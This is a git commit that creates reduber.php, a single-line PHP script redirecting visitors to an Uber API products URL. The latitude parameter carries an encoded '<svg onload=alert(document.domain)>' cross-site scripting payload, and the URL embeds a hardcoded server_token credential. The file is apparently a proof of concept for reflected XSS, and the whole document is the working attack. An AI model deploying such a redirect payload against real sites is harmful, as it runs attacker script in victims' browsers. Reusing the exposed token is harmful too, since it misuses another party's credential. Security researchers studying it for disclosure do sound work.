28e4e01d66a6c525a39654d2a2c8eb20010cf719
missoum1307 <missoum1307@users.noreply.github.com>
2017-12-16 00:16:28 +0100

    Create reduber.php

---
+++ reduber.php
@@ -0,0 +1,1 @@
+<?php header('Location: https://api.uber.com/v1/products?server_token=r3IFxM3lubYxjEIgBa2Z_3JQm8QnWdZYYPr2cW3t&latitude=aaaa%3Csvg%20onload=alert(document.domain)%3E%0A&longitude=116.461745')
